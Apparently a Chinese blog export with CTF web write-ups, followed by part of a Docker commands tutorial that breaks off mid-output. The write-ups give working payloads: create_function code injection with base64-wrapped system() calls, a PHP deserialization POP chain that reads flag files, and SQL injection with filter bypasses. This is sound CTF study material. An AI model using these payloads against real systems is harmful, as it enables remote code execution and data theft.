preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this-&gt;arg)) &#123;            die('No!No!No!');        &#125; else &#123;            include \"flag.php\";           //There is no code to print flag in flag.php           $func('', $this-&gt;arg);        &#125;\n\n利用点 $func(&#39;&#39;, $this-&gt;arg); ，根据Code Breaking 挑战赛 Writeup。构造出\ncreate_function(&apos;&apos;,&apos;return 123;&#125;phpinfo();//)等价于create_function()&#123;\treturn 123;&#125;phpinfo();//)\n\n当$func 为create_function，$this-&gt;arg为 return 123;}phpinfo();//)的时候，就会执行到phpinfo(); \n上面只是构造了利用，这里还需要绕过两个条件。\npreg_match('/^[a-z0-9]*$/isD', $this-&gt;func)preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this-&gt;arg)\n\n第一个正则对传入的字符串进行了首位必须是字母数字的匹配，直接用wp中给出的 \\ 绕过。\n第二个正则过滤了很多的关键字，但是没有过滤base64_decode，system等函数，这里直接用base64_decode+system绕过，但是需要注意的 ，这个正则中过滤了= ，有时候进行base64编码的时候，会遇到末尾有=的情况，这种情况可以换成其他函数进行编码。构造如下payload\n$func=&quot;\\create_function&quot;;$arg=&quot;return 111;&#125;system(base64_decode(d2hvYW1p));//&quot;;# d2hvYW1p whoami\n\n序列化构造payload\n&lt;?php# 反序列化 Aclass A&#123;    public $var;&#125;class B&#123;    public $func;    public $arg;&#125;if (1) &#123;    $a = new A();    $b = new B();    $b-&gt;func = \"\\create_function\";    $b-&gt;arg = \"return 111;&#125;system(base64_decode(d2hvYW1p));//\";    $a-&gt;var = $b;    var_dump(serialize($a));&#125; else &#123;    highlight_file(__FILE__);&#125;\n\n得到\nO:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:16:&quot;\\create_function&quot;;s:3:&quot;arg&quot;;s:46:&quot;return 111;&#125;system(base64_decode(d2hvYW1p));//&quot;;&#125;&#125;\n\n提交\n\n成功执行\npayload\nY2F0IGZsYWcucGhw // cat flag.phpO:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:16:&quot;\\create_function&quot;;s:3:&quot;arg&quot;;s:54:&quot;return 111;&#125;system(base64_decode(Y2F0IGZsYWcucGhw));//&quot;;&#125;&#125;\n\n\n这里还需要查看 Tru3flag.php 文件，这里会存在一个小小的问题\ncat Tru3flag.php 进行base64编码后得到 Y2F0IFRydTNmbGFnLnBocA==后面会有两个=,不能过正则。这里我直接采用$&#123;IFS&#125;代替空格。cat$&#123;IFS&#125;Tru3flag.php 进行base64编码  得到 Y2F0JHtJRlN9VHJ1M2ZsYWcucGhw\n\nO:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:16:&quot;\\create_function&quot;;s:3:&quot;arg&quot;;s:66:&quot;return 111;&#125;system(base64_decode(Y2F0JHtJRlN9VHJ1M2ZsYWcucGhw));//&quot;;&#125;&#125;\n\n\nweb-xxc考点源码泄露\n反序列化（多个文件的pop链构造）\n前言这道题对于我来说还算是比较难，在网上找到一位师傅写的wp，只能到执行phpinfo，不能拿到flag，目前这道题的wp还没有师傅公布出来，做这道题对于构造pop链有一定提升，所以照着这位大佬的wp复现。\nwp 地址\nhttps://blog.csdn.net/weixin_43610673/article/details/120496058\n前置知识魔术方法\n__destruct \t该函数会在类的一个对象被删除时自动调用。__call\t在对象中调用一个不可访问方法时，__call() 会被调用。__get\t读取不可访问（protected 或 private）或不存在的属性的值时，__get() 会被调用__toString\t方法用于一个类被当成字符串时应怎样回应。其实就是调用__isset\t\t当对不可访问（protected 或 private）或不存在的属性调用 isset() 或 empty()。会被调用。__invoke\t当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。\n\n复现过程这道题通过扫目录，扫到了源码，直接在本地搭建复现。\n目录结构\n因为文件太多，直接就贴关键地方截图了。\n利用点\n目前只发现一个利用点，这个利用点位与 class\\Method\\Func\\GenerateFile.php 文件，GenerateFile的myGen方法中call_user_fun函数 ，这个利用点的$length并不可控，这也就是为什么只能执行 phpinfo() 的原因，因为不能控制参数。\npop链构造class\\Control\\State\\StopHook.php\n\n序列化入口，class\\Control\\State\\StopHook.php ,\n当序列化StopHook类的时候，会自动调用__destruct方法，在__destruct方法中又会调用_exit，这里的_exit方法中的 $process-&gt;stop() 能够触发 class\\Faker\\MyGenerator.php 中MyGenerator的__call方法。\nclass\\Faker\\MyGenerator.php\n\n__call方法中的echo $this-&gt;defaultCall能够触发class\\Method\\Func\\GetFile.php中的GetFile类的__toString方法，__toString中会调用getFiles方法，而getFiles方法中的 $this-&gt;flag-&gt;{$this-&gt;value}能够触发class\\Method\\Func\\GetDefault.php中的__isset方法。\nclass\\Method\\Func\\GetFile.php\n\nclass\\Method\\Func\\GetDefault.php\n\nclass\\Method\\Func\\GetDefault.php中的__isset方法会调用popup 方法，popup方法中的 return $s($length) ,可以触发class\\Method\\Func\\GenerateFile.php中的__invoke方法，而__invoke方法又会调用 myGen，通过控制$this-&gt;source-&gt;generate来执行phpinfo。\nclass\\Method\\Func\\GenerateFile.php\n\n链条\nStopHook::__destruct-&gt;StopHook::_exit-&gt;MyGenerator::__call-&gt;GetFile::__toString-&gt;GetFile::getFiles-&gt;GetDefault::__isset-&gt;GetDefault::popup-&gt;GenerateFile::__invoke-&gt;GenerateFile::myGen-&gt;利用点call_user_func\n\n&lt;?phpnamespace Control\\State&#123;    use Faker\\MyGenerator;    class StopHook &#123;        protected $output;        protected $config = ['auto' =&gt; 0];        protected static $states = ['started', 'running', 'finished', 'waiting', 'fail'];        protected $processes;        # 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。        public function __construct()        &#123;            $this-&gt;processes = [new MyGenerator()];        &#125;        public function __destruct() &#123;//            echo \"123666\";            $this-&gt;_exit();        &#125;        private function _exit() &#123;            // 返回单元顺序相反的数组 逆序数组            foreach(array_reverse($this-&gt;processes) as $process) &#123;                //                if (!$process-&gt;isRunning) &#123;//                    echo \"omg\";                    continue;                &#125;                # $process-&gt;stop() 通常可触发__call                # $process =                $process-&gt;stop();            &#125;        &#125;    &#125;&#125;namespace Faker&#123;    use Method\\Func\\GetFile;    class MyGenerator &#123;        protected $defaultValue;        public function __construct()        &#123;            $this-&gt;defaultValue = new GetFile();        &#125;        # 在对象中调用一个不可访问方法时调用        public function __call($method, $arg_array) &#123;//            echo \"__call\";            echo $this-&gt;defaultCall;            return $this-&gt;defaultCall;        &#125;        # 获得一个类的成员变量时调用        public function __get($property) &#123;//            echo \"__get\";            return $this-&gt;defaultValue;        &#125;    &#125;&#125;namespace Method\\Func&#123;    class GenerateFile &#123;        public $flag;        protected $buffer;        # __invoke 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。        public function __construct()        &#123;            $this-&gt;source-&gt;generate = \"phpinfo\";        &#125;        public function __invoke($param) &#123;//            echo \"__invoke\";            $this-&gt;myGen($param);        &#125;        public function myGen($length) &#123;//            echo \"myGen\";            $s = $this-&gt;buffer-&gt;read;            # 利用点            call_user_func($this-&gt;source-&gt;generate, $length);            return $s;        &#125;    &#125;    class GetDefault &#123;        private $source;        public function __construct()        &#123;            $this-&gt;source = new GenerateFile();            $this-&gt;source-&gt;flag = \"myTest\";        &#125;        public function popup($length) &#123;//            echo \"popup\";            $s = $this-&gt;source;            if ($s-&gt;flag != \"myTest\") &#123;                return \"denied\";            &#125;            return $s($length);        &#125;        # 当对不可访问属性调用 isset()或empty()时调用        public function __isset($property) &#123;//            echo \"__isset\";//            echo $property;            if ($property != \"test\") &#123;                return false;            &#125;            return !$this-&gt;popup(666);        &#125;    &#125;    class GetFile &#123;        private $flag = true;        private $files = [];        # 类被当成字符串时的回应方法        public function __construct()        &#123;            $this-&gt;flag = new GetDefault();            $this-&gt;value = 'test';        &#125;        public function __toString() &#123;            #//            echo \"__toString\";            return $this-&gt;getFiles();        &#125;        public function getFiles() &#123;            if (!$this-&gt;flag) return \"denied\";            $s = \"\";            if (isset($this-&gt;flag-&gt;&#123;$this-&gt;value&#125;)) &#123;                return \"test\";            &#125;            foreach ($this-&gt;files as $file) &#123;                $s += $file-&gt;read();            &#125;            return $s;        &#125;    &#125;&#125;namespace &#123;    # StopHook::__destruct-&gt;StopHook::_exit-&gt;MyGenerator::__call-&gt;GetFile::__toString-&gt;GetFile::getFiles-&gt;GetDefault::__isset-&gt;GetDefault::popup-&gt;GenerateFile::__invoke-&gt;GenerateFile::myGen-&gt;利用点call_user_func    # StopHook::__destruct-&gt;StopHook::_exit-&gt;MyGenerator::__get-&gt;GetDefault::__isset-&gt;GetDefault::popup-&gt;GenerateFile::__invoke-&gt;利用点call_user_func    echo base64_encode(serialize(new Control\\State\\StopHook()));&#125;\n\n得到\nTzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6Mzp7czo5OiIAKgBvdXRwdXQiO047czo5OiIAKgBjb25maWciO2E6MTp7czo0OiJhdXRvIjtpOjA7fXM6MTI6IgAqAHByb2Nlc3NlcyI7YToxOntpOjA7TzoxNzoiRmFrZXJcTXlHZW5lcmF0b3IiOjE6e3M6MTU6IgAqAGRlZmF1bHRWYWx1ZSI7TzoxOToiTWV0aG9kXEZ1bmNcR2V0RmlsZSI6Mzp7czoyNToiAE1ldGhvZFxGdW5jXEdldEZpbGUAZmxhZyI7TzoyMjoiTWV0aG9kXEZ1bmNcR2V0RGVmYXVsdCI6MTp7czozMDoiAE1ldGhvZFxGdW5jXEdldERlZmF1bHQAc291cmNlIjtPOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiOjM6e3M6NDoiZmxhZyI7czo2OiJteVRlc3QiO3M6OToiACoAYnVmZmVyIjtOO3M6Njoic291cmNlIjtPOjg6InN0ZENsYXNzIjoxOntzOjg6ImdlbmVyYXRlIjtzOjc6InBocGluZm8iO319fXM6MjY6IgBNZXRob2RcRnVuY1xHZXRGaWxlAGZpbGVzIjthOjA6e31zOjU6InZhbHVlIjtzOjQ6InRlc3QiO319fX0\n\n执行\n小结没成功拿到flag，也学到了不少，也是头一次构造这么复杂的pop链。还是太菜了。\n拿flag的解法前言上次做到只能执行phpinfo，就有点不甘心，为什么别人就能getshell，我就不能。经过这几天在群里咨询一些师傅，一个师傅(Object师傅)给了我一条博客链接2021 第二届 “祥云杯” 网络安全大赛 WEB WriteUp，里面是祥云杯的ezyii 题wp，不过题目内容大致差不多，有一个点基本一样，就是用call_user_func($this-&gt;source-&gt;generate,$length);，只能控制$this-&gt;source-&gt;generate，而不能控制$length。这里到底要怎么才能利用呢？答案是回调函数。但是知道答案后，并没有第一时间做出来，我把$this-&gt;source-&gt;generate赋值为function (){system(&#39;phpinfo();&#39;);} ，然后进行反序列化的时候，没有了回显，这里一直卡了我很久。\n直到看到 Opis Closure\n\nIf you ever used closures then you probably know that closures are not serializable. Trying to serialize a closure will result into an exception:\n如果您曾经使用过闭包，那么您可能知道闭包是不可序列化的。尝试序列化闭包将导致异常：\n\n意思就是以function (){system(&#39;phpinfo();&#39;);}的方式进行序列化，会失败。\nuse Opis\\Closure\\SerializableClosure;// Recursive factorial closure$factorial = function ($n) use (&amp;$factorial) &#123;  return $n &lt;= 1 ? 1 : $factorial($n - 1) * $n;&#125;;// Wrap the closure$wrapper = new SerializableClosure($factorial);// Now it can be serialized$serialized = serialize($wrapper);\n\n里面给出了序列化闭包的方式，但当我按照里面的方式去使用的时候，发现还是没有回显。\n直到今早 ，又重新看了这篇博客祥云杯2021 ezyii的反序列化pop链分析，这篇描述得更详细些。得到。\nfinal class PumpStream&#123;        private $source;        private $size=-10;        private $buffer;        public function __construct()&#123;            $this-&gt;buffer=new DefaultGenerator('j');            include(\"closure/autoload.php\");            $a = function()&#123;phpinfo();&#125;;            $a = \\Opis\\Closure\\serialize($a);            $b = unserialize($a);            $this-&gt;source=$b;        &#125;    &#125;&#125;\n\n里面对$a = function(){phpinfo();};进行了如下三个步骤，序列化闭包，反序列化，赋值给$this-&gt;source。当我按照这样的方式去构造时，我又遇到了没有回显的问题，为此，我还特地弄了个xdebug调试，调试到$a = \\Opis\\Closure\\serialize($a);就结束了。为什么会这样呢?经过对比两份payload，我发现，人家都引入了include(&quot;closure/autoload.php&quot;);，这个文件，这也是解决问题的关键所在，这个就是\\Opis\\Closure\\serialize的环境。\n接下来直接贴payload。\n拿flag payload&lt;?phpnamespace Control\\State;use Faker\\MyGenerator;class StopHook &#123;    protected $output;    protected $config = ['auto' =&gt; 0];    protected static $states = ['started', 'running', 'finished', 'waiting', 'fail'];    protected $processes;    # 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。    public function __construct()    &#123;        $this-&gt;processes = [new MyGenerator()];    &#125;    public function __destruct() &#123;        echo \"__destruct\".\"\\n\";        $this-&gt;_exit();    &#125;    private function _exit() &#123;        echo \"_exit\".\"\\n\";        // 返回单元顺序相反的数组 逆序数组        foreach(array_reverse($this-&gt;processes) as $process) &#123;            # 这里会触发__get() 但是不会执行 continue            if (!$process-&gt;isRunning) &#123;                continue;            &#125;            # $process-&gt;stop() 通常可触发__call 但是并没有触发            # 这里会触发 __call()            $process-&gt;stop();        &#125;    &#125;&#125;# 序列化echo base64_encode(serialize(new StopHook()));namespace Faker;use Method\\Func\\GetFile;class MyGenerator &#123;    protected $defaultValue;    public function __construct()    &#123;        $this-&gt;defaultValue = new GetFile();    &#125;    # 在对象中调用一个不可访问方法时调用    public function __call($method, $arg_array) &#123;        echo \"__call\".\"\\n\";        echo $this-&gt;defaultCall;        return $this-&gt;defaultCall;    &#125;    # 获得一个类的成员变量时调用    public function __get($property) &#123;        echo \"__get\".\"\\n\";        # return new GetFile();        return $this-&gt;defaultValue;    &#125;&#125;namespace Method\\Func;class GetFile &#123;    private $flag = true;    private $files = [];    public function __construct()    &#123;        $this-&gt;flag = new GetDefault();        $this-&gt;value = 'test';    &#125;    # 类被当成字符串时的回应方法    public function __toString() &#123;        echo \"__toString\";        #        return $this-&gt;getFiles();    &#125;    public function getFiles() &#123;        if (!$this-&gt;flag) return \"denied\";        $s = \"\";        # 这里能够触发 _isset        if (isset($this-&gt;flag-&gt;&#123;$this-&gt;value&#125;)) &#123;            return \"test\";        &#125;        foreach ($this-&gt;files as $file) &#123;            $s += $file-&gt;read();        &#125;        return $s;    &#125;&#125;namespace Method\\Func;class GetDefault &#123;    private $source;    public function __construct()    &#123;        $this-&gt;source = new GenerateFile();        $this-&gt;source-&gt;flag = 'myTest';    &#125;    public function popup($length) &#123;        echo \"popup\".\"\\n\";        $s = $this-&gt;source;        if ($s-&gt;flag != \"myTest\") &#123;            return \"denied\";        &#125;        return $s($length);    &#125;    # 当对不可访问属性或调用isset()或empty()时调用    public function __isset($property) &#123;        echo \"__isset\".\"\\n\";        if ($property != \"test\") &#123;            return false;        &#125;        return !$this-&gt;popup(666);    &#125;&#125;namespace Method\\Func;class GenerateFile &#123;    public $flag;    protected $buffer;    # __invoke 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。    public function __construct()    &#123;        include(\"closure/autoload.php\");        $a = function ()&#123;system('cat /f1@g.txt');&#125;;        $a = \\Opis\\Closure\\serialize($a);        $b = unserialize($a);        $this-&gt;source-&gt;generate = $b;//          $this-&gt;source-&gt;generate = 'phpinfo'; // 能够执行    &#125;    public function __invoke($param) &#123;        echo \"__invoke\".\"\\n\";        $this-&gt;myGen($param);    &#125;    public function myGen($length) &#123;        $s = $this-&gt;buffer-&gt;read;        # 利用点//        call_user_func($this-&gt;source-&gt;generate, $length);        call_user_func($this-&gt;source-&gt;generate,$length);        return $s;    &#125;&#125;?&gt;\n\nTzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6Mzp7czo5OiIAKgBvdXRwdXQiO047czo5OiIAKgBjb25maWciO2E6MTp7czo0OiJhdXRvIjtpOjA7fXM6MTI6IgAqAHByb2Nlc3NlcyI7YToxOntpOjA7TzoxNzoiRmFrZXJcTXlHZW5lcmF0b3IiOjE6e3M6MTU6IgAqAGRlZmF1bHRWYWx1ZSI7TzoxOToiTWV0aG9kXEZ1bmNcR2V0RmlsZSI6Mzp7czoyNToiAE1ldGhvZFxGdW5jXEdldEZpbGUAZmxhZyI7TzoyMjoiTWV0aG9kXEZ1bmNcR2V0RGVmYXVsdCI6MTp7czozMDoiAE1ldGhvZFxGdW5jXEdldERlZmF1bHQAc291cmNlIjtPOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiOjM6e3M6NDoiZmxhZyI7czo2OiJteVRlc3QiO3M6OToiACoAYnVmZmVyIjtOO3M6Njoic291cmNlIjtPOjg6InN0ZENsYXNzIjoxOntzOjg6ImdlbmVyYXRlIjtDOjMyOiJPcGlzXENsb3N1cmVcU2VyaWFsaXphYmxlQ2xvc3VyZSI6MTkxOnthOjU6e3M6MzoidXNlIjthOjA6e31zOjg6ImZ1bmN0aW9uIjtzOjM4OiJmdW5jdGlvbiAoKXtcc3lzdGVtKCdjYXQgL2YxQGcudHh0Jyk7fSI7czo1OiJzY29wZSI7czoyNDoiTWV0aG9kXEZ1bmNcR2VuZXJhdGVGaWxlIjtzOjQ6InRoaXMiO047czo0OiJzZWxmIjtzOjMyOiIwMDAwMDAwMDAyZjEwODQ3MDAwMDAwMDA3YWMzZTgwYiI7fX19fX1zOjI2OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmaWxlcyI7YTowOnt9czo1OiJ2YWx1ZSI7czo0OiJ0ZXN0Ijt9fX19\n\n\n总结这道题做了很长时间，挺耽误时间的，经常是看着屏幕，一点思路都没有。但是反过来说，下次再遇到这个题，我还是只能执行phpinfo，会很不甘心。\nweb-ctfmanage解题过程sql注入检测注入方式\na=1 uniunionon selselectect 1,2,3#&amp;b=1 a=1 Union Select 1,2,3#&amp;b=1\n\n获取数据库表\n1 Union Select 1,2,database();# =&gt;ctf\n\n获取表名\n1 Union Select 1,2,group_concat(table_name) From mysql.innodb_table_stats Where database_name = database();#=&gt;flagisthere,ilikectf\n\n无列名注入获取值\n1 Union Select * From ilikectf;# =&gt;36476,sgrsgef,gg.php\n\n代码审计打开gg.php\nif(base64_encode(hex2bin(strrev(bin2hex($_GET['sy']))))===$secret)&#123;    if($_POST['ha']!==$_POST['lo']&amp;&amp;md5($_POST['ha'])===md5($_POST['lo']))&#123;    echo $flag;    &#125;    else&#123;        echo 'ohhhhh so close !!!';    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;\n\n看到第一个条件可能会愣住，不过不影响，在登录页面看源代码的时候得到。\n\nhjZX1pcnVmdmRzZWZ/bGlg==\n\necho hex2bin(strrev(bin2hex(base64_decode(\"hjZX1pcnVmdmRzZWZ/bGlg==\"))));\n\n得到\nilovectfverymuch\n\n绕过\nif($_POST[&apos;ha&apos;]!==$_POST[&apos;lo&apos;]&amp;&amp;md5($_POST[&apos;ha&apos;])===md5($_POST[&apos;lo&apos;]))\n\nPOST：\nha[]=a&amp;lo[]=b\n\n获取flag\n小结这道题的难点我觉得主要是在注入点检测、和无列名获取值的payload构造，并不是那种常规思路，我也不知道为什么通过Union Select 或ununionion selselectect这样能够检测出来，看不到源码。不过可以通过FUZZ，但我不太熟，而且也没有字典，是时候收集一波了。\n","categories":["CTF","比赛复盘"],"tags":["SQL注入","反序列化","crypto","misc"]},{"title":"Docker常用命令","url":"/2021/03/12/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","content":"docker官网文档地址：https://docs.docker.com/get-docker/\n安装docker流程\n1、卸载旧的版本\n2、需要的安装报\n3、设置镜像的仓库\n4、安装docker需要的依赖\n5、启动\n阿里云容器镜像加速地址：https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors\nDocker基本概念镜像    \n容器\n仓库\n容器与镜像的关系类似于面向对象编程中的对象与类。\nDocker常用命令\n\n帮助命令docker version \n显示docker的常用信息\nyangfan@yangfan-virtual-machine:~$ docker versionClient: Docker Engine - Community Version:           20.10.5 API version:       1.41 Go version:        go1.13.15 Git commit:        55c4c88 Built:             Tue Mar  2 20:18:05 2021 OS/Arch:           linux/amd64 Context:           default Experimental:      trueGot permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.24/version: dial unix /var/run/docker.sock: connect: permission denied\n\ndocker info\n显示docker的信息信息，包括镜像和容器的数量\nyangfan@yangfan-virtual-machine:~$ docker infoClient: Context:    default Debug Mode: false Plugins:  app: Docker App (Docker Inc., v0.9.1-beta3)  buildx: Build with BuildKit (Docker Inc., v0.5.1-docker)Server:ERROR: Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.24/info: dial unix /var/run/docker.sock: connect: permission deniederrors pretty printing info\n\ndocker –help\n显示帮助信息\nyangfan@yangfan-virtual-machine:~$ docker --helpUsage:  docker [OPTIONS] COMMANDA self-sufficient runtime for containersOptions:      --config string      Location of client config files (default \"/home/yangfan/.docker\")  -c, --context string     Name of the context to use to connect to the daemon (overrides DOCKER_HOST env var and                           default context set with \"docker context use\")  -D, --debug              Enable debug mode  -H, --host list          Daemon socket(s) to connect to  -l, --log-level string   Set the logging level (\"debug\"|\"info\"|\"warn\"|\"error\"|\"fatal\") (default \"info\")      --tls                Use TLS; implied by --tlsverify      --tlscacert string   Trust certs signed only by this CA (default \"/home/yangfan/.docker/ca.pem\")      --tlscert string     Path to TLS certificate file (default \"/home/yangfan/.docker/cert.pem\")      --tlskey string      Path to TLS key file (default \"/home/yangfan/.docker/key.pem\")      --tlsverify          Use TLS and verify the remote  -v, --version            Print version information and quitManagement Commands:  app*        Docker App (Docker Inc., v0.9.1-beta3)  builder     Manage builds  buildx*     Build with BuildKit (Docker Inc., v0.5.1-docker)  config      Manage Docker configs  container   Manage containers  context     Manage contexts  image       Manage images  manifest    Manage Docker image manifests and manifest lists  network     Manage networks  node        Manage Swarm nodes  plugin      Manage plugins  secret      Manage Docker secrets  service     Manage services  stack       Manage Docker stacks  swarm       Manage Swarm  system      Manage Docker  trust       Manage trust on Docker images  volume      Manage volumesCommands:  attach      Attach local standard input, output, and error streams to a running container  build       Build an image from a Dockerfile  commit      Create a new image from a container's changes  cp          Copy files/folders between a container and the local filesystem  create      Create a new container  diff        Inspect changes to files or directories on a container's filesystem  events      Get real time events from the server  exec        Run a command in a running container  export      Export a container's filesystem as a tar archive  history     Show the history of an image  images      List images  import      Import the contents from a tarball to create a filesystem image  info        Display system-wide information  inspect     Return low-level information on Docker objects  kill        Kill one or more running containers  load        Load an image from a tar archive or STDIN  login       Log in to a Docker registry  logout      Log out from a Docker registry  logs        Fetch the logs of a container  pause       Pause all processes within one or more containers  port        List port mappings or a specific mapping for the container  ps          List containers  pull        Pull an image or a repository from a registry  push        Push an image or a repository to a registry  rename      Rename a container  restart     Restart one or more containers  rm          Remove one or more containers  rmi         Remove one or more images  run         Run a command in a new container  save        Save one or more images to a tar archive (streamed to STDOUT by default)  search      Search the Docker Hub for images  start       Start one or more stopped containers  stats       Display a live stream of container(s) resource usage statistics  stop        Stop one or more running containers  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE  top         Display the running processes of a container  unpause     Unpause all processes within one or more containers  update      Update configuration of one or more containers  version     Show the Docker version information  wait        Block until one or more containers stop, then print their exit codesRun 'docker COMMAND --help' for more information on a command.To get more help with docker, check out our guides at https://docs.docker.com/go/guides/\n\n镜像命令docker images\n查看所有本地的主机上的镜像\nyangfan@yangfan-virtual-machine:~$ sudo docker images[sudo] yangfan 的密码： REPOSITORY    TAG       IMAGE ID       CREATED         SIZEmysql         5.7       a70d36bc331a   6 weeks ago     449MBcentos        latest    300e315adb2f   2 months ago    209MBhello-world   latest    bf756fb1ae65   14 months ago   13.3kB\n\ndocker search  镜像名\n查找镜像\nyangfan@yangfan-virtual-machine:~$ sudo docker search mysqlNAME                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDmysql                             MySQL is a widely used, open-source relation…   10570     [OK]       mariadb                           MariaDB Server is a high performing open sou…   3949      [OK]       mysql/mysql-server                Optimized MySQL Server Docker images. Create…   774                  [OK]percona                           Percona Server is a fork of the MySQL relati…   527       [OK]       centos/mysql-57-centos7           MySQL 5.7 SQL database server                   87                   mysql/mysql-cluster               Experimental MySQL Cluster Docker images. Cr…   79                   centurylink/mysql                 Image containing mysql. Optimized to be link…   59                   [OK]bitnami/mysql                     Bitnami MySQL Docker Image                      48                   [OK]deitch/mysql-backup               REPLACED! Please use http://hub.docker.com/r…   41                   [OK]databack/mysql-backup             Back up mysql databases to... anywhere!         39                   prom/mysqld-exporter                                                              37                   [OK]tutum/mysql                       Base docker image to run a MySQL database se…   35                   schickling/mysql-backup-s3        Backup MySQL to S3 (supports periodic backup…   29                   [OK]linuxserver/mysql                 A Mysql container, brought to you by LinuxSe…   27                   centos/mysql-56-centos7           MySQL 5.6 SQL database server                   20                   circleci/mysql                    MySQL is a widely used, open-source relation…   20                   mysql/mysql-router                MySQL Router provides transparent routing be…   18                   arey/mysql-client                 Run a MySQL client from a docker container      17                   [OK]fradelg/mysql-cron-backup         MySQL/MariaDB database backup using cron tas…   12                   [OK]yloeffler/mysql-backup            This image runs mysqldump to backup data usi…   7                    [OK]openshift/mysql-55-centos7        DEPRECATED: A Centos7 based MySQL v5.5 image…   6                    devilbox/mysql                    Retagged MySQL, MariaDB and PerconaDB offici…   3                    ansibleplaybookbundle/mysql-apb   An APB which deploys RHSCL MySQL                2                    [OK]jelastic/mysql                    An image of the MySQL database server mainta…   1                    widdpim/mysql-client              Dockerized MySQL Client (5.7) including Curl…   1                    [OK]\n\ndocker pull 镜像名\n下载镜像 \n默认使用最新版\nyangfan@yangfan-virtual-machine:~$ sudo docker pull citizenstig/dvwaUsing default tag: latestlatest: Pulling from citizenstig/dvwa8387d9ff0016: Pull complete 3b52deaaf0ed: Pull complete 4bd501fad6de: Pull complete a3ed95caeb02: Pull complete 790f0e8363b9: Pull complete 11f87572ad81: Pull complete 341e06373981: Pull complete 709079cecfb8: Pull complete 55bf9bbb788a: Pull complete b41f3cfd3d47: Pull complete 70789ae370c5: Pull complete 43f2fd9a6779: Pull complete 6a0b3a1558bd: Pull complete 934438c9af31: Pull complete 1cfba20318ab: Pull complete de7f3e54c21c: Pull complete 596da16c3b16: Pull complete e94007c4319f: Pull complete 3c013e645156: Pull complete 7b3eb1ac6cfe: Pull complete Digest: sha256:1c0ab894f0bf41351519c8388a282c0a178216e9ce8f0399a162472070379dc6Status: Downloaded newer image for citizenstig/dvwa:latestdocker.io/citizenstig/dvwa:latest\n\n指定版本\ndocker pull 镜像名[:tag]\nyangfan@yangfan-virtual-machine:~$ sudo docker pull mysql:5.75.7: Pulling from library/mysqla076a628af6f: Pull complete f6c208f3f991: Pull complete 88a9455a9165: Pull complete 406c9b8427c6: Pull complete 7c88599c0b25: Pull complete 25b5c6debdaf: Pull complete 43a5816f1617: Pull complete 1831ac1245f4: Pull complete 37677b8c1f79: Pull complete 27e4ac3b0f6e: Pull complete 7227baa8c445: Pull complete Digest: sha256:b3d1eff023f698cd433695c9506171f0d08a8f92a0c8063c1a4d9db9a55808dfStatus: Downloaded newer image for mysql:5.7docker.io/library/mysql:5.7\n\ndocker rmi \n删除镜像包\ndocker rmi  id\n通过id删除镜像\nyangfan@yangfan-virtual-machine:~$ sudo docker rmi a70d36bc331aUntagged: mysql:5.7Untagged: mysql@sha256:b3d1eff023f698cd433695c9506171f0d08a8f92a0c8063c1a4d9db9a55808dfDeleted: sha256:a70d36bc331a13d297f882d3d63137d24b804f29fa67158c40ad91d5050c39c5Deleted: sha256:50c77bf7bcddd1f1d97789d80ac2404eec22c860c104e858620d2a2e321f0ef7Deleted: sha256:14244329b83dfc8982398ee4104a548385652d2bffb957798ff86a419013efd6Deleted: sha256:6d990477f90af28473eb601a9bca22253f6381e053c5a8edda0a4f027e124a3cDeleted: sha256:ee0449796df204071589162fc16f8d65586312a40c68d1ba156c93c56f5e5ce8Deleted: sha256:d08533f1e2acc40ad561a46fc6a76b54c739e6b24f077c183c5709e0a6885312Deleted: sha256:4f9d91a4728e833d1062fb65a792f06e22e425f63824f260c8b5a64b776ddc38Deleted: sha256:20bf4c759d1b0d0e6286d2145453af4e0e1b7ba3d4efa3b8bce46817ad4109deDeleted: sha256:a9371bbdf16ac95cc72555c6ad42f79b9f03a82d964fe89d52bdc5f335a5f42aDeleted: sha256:5b02130e449d94f51e8ff6e5f7d24802246198749ed9eb064631e63833cd8f1dDeleted: sha256:ab74465b38bc1acb16c23091df32c5b7033ed55783386cb57acae8efff9f4b37Deleted: sha256:cb42413394c4059335228c137fe884ff3ab8946a014014309676c25e3ac86864\n\ndocker rmi -f $(docker images -qa)\n删除全部镜像\nyangfan@yangfan-virtual-machine:~$ sudo docker rmi -f $(sudo docker images -a)Untagged: mysql:5.7Untagged: 